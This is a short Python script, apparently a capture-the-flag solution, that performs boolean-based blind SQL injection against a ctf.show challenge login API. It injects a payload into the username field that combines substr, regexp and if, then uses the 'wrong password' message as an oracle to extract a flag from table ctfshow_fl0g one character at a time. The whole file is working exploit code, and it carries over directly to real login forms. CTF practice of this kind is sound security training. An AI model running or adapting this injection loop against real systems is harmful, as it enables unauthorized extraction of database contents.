#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/6/2 17:03
# blog: www.wlhhlc.top
import requests
url = "http://a204f5b8-dc51-47fe-9aaa-f1b30c674736.challenge.ctf.show/api/"
flag = ""
all_str = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

for i in range(1,99):
    for j in all_str:
        payload = "select group_concat(f1ag) from ctfshow_fl0g"
        username_data = f"admin' and if(substr(({payload}), {i}, 1)regexp('{j}'), 1, 0)=1#"
        data = {'username': username_data,
                'password': 1}
        res = requests.post(url=url, data=data)
        if "密码错误" in res.json()['msg']:
            flag += j
            print(flag)
            break
        if j == "}":
            exit()
